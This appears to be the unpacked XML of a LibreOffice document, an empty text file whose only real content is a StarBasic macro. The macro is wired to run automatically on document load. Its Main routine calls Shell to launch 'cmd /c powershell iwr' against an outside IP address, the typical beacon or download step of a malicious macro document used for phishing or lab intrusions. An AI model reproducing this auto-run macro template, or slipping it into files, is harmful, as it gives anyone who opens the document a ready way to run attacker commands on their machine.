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Basic/Standard/xxx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>
    <office:event-listeners>
      <script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.xxx.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
  <office:font-face-decls>
    <style:font-face style:name="Bitstream Vera Sans" svg:font-family="'Bitstream Vera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itstream Vera Sans" svg:font-family="'Bitstream Vera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Bitstream Vera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Bitstream Vera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1" style:font-family-complex="'Noto Sans Devanagari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04T11:35:39.864356630</meta:creation-date>
    <meta:generator>LibreOffice/7.2.2.2$Linux_X86_64 LibreOffice_project/20$Build-2</meta:generator>
    <dc:date>2021-11-04T15:54:24.085908065</dc:date>
    <meta:editing-duration>PT4H18M43S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="0" meta:word-count="0" meta:character-count="0" meta:non-whitespace-character-count="0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xxx"/>
</library:library>
</file>

<file path=Basic/Standard/xxx.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="xxx" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell iwr 192.168.49.167")
End Sub
</script:module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